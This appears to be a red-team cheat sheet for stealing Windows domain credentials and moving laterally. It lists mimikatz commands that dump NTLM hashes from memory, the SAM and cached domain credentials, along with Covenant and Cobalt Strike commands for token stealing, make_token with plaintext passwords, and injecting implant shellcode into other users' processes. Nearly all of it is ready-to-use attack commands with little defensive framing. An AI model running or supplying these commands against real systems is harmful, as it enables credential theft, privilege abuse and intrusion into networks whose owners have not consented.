Some method to stealing, impersonating creds. These technique used to move around domain and access resource.

### LoginPasswords
This will retrive NTLM hash which can be cracked with john or hashcat or use in pass-the-hash technique.
```
> mimikatz sekurlsa::logonpasswords
```

### Retrive SAM Password
NTLM hash from SAM can be extracted with this command:
```
token::elevate lsadump::sam
```

### Domain Cached Creds
```
> Mimikatz token::elevate lsadump::cache
```


## Token Impersonation
By "impersonating" the token of a process being run by another user we effectively assume their privileges, which can be used for lateral movement.

Using covenant:
```
>ps
Pid   Ppid  Name                  SessionID  Owner         Architecture  Path
---   ----  ----                  ---------  -----         ------------  ----
4248  5284  cmd                   1          CYBER\\n.lamb  x64         C:\\Windows\\System32\\cmd.exe

>ImpersonateUser CYBER\\n.lamb
```

Using Cobalt Strike:
```
>steal_token 4248
>run_various_command_as_the_user
>rev2self
```

### Make Token
```
> MakeToken n.lamb cyberbotic.io PASSWORD ##Covenant

> make_token CYBER\n.lamb PASSWORD ##Cobalt
```


### Process Injection
Process Injection is a method for executing code in the address space of another process. This process could belong to a domain or local user, and injecting implant shellcode would allow it to run under the context of that user.

***Covenant:***
1. Get Process List with `ps`
2.  Type `inject` another window will open
3.  Provide the shellcode.bin and the PID

***Cobalt***:
`inject 4248 x64 tcp-localhost`

